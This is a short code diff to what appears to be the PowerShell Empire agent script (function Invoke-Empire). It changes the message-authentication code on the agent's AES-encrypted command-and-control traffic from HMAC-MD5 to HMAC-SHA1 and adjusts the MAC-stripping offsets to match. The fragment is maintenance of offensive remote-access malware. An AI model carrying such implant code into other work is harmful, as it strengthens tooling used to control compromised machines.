@@ -523,7 +523,8 @@ function Invoke-Empire {
         $AES.Key = $encoding.GetBytes($SessionKey);
         $AES.IV = $IV;
         $ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
-        $hmac = New-Object System.Security.Cryptography.HMACMD5;
+        # append the MAC
+        $hmac = New-Object System.Security.Cryptography.HMACSHA1;
         $hmac.Key = $encoding.GetBytes($SessionKey);
         $ciphertext + $hmac.ComputeHash($ciphertext);
     } 
@@ -532,9 +533,9 @@ function Invoke-Empire {
         param ($inBytes)
         if($inBytes.Length -gt 32){
             # Verify the MAC
-            $mac = $inBytes[-16..-1];
-            $inBytes = $inBytes[0..($inBytes.length - 17)];
-            $hmac = New-Object System.Security.Cryptography.HMACMD5;
+            $mac = $inBytes[-20..-1];
+            $inBytes = $inBytes[0..($inBytes.length - 21)];
+            $hmac = New-Object System.Security.Cryptography.HMACSHA1;
             $hmac.Key = $encoding.GetBytes($SessionKey);
             $expected = $hmac.ComputeHash($inBytes);
             if (@(Compare-Object $mac $expected -sync 0).Length -ne 0){
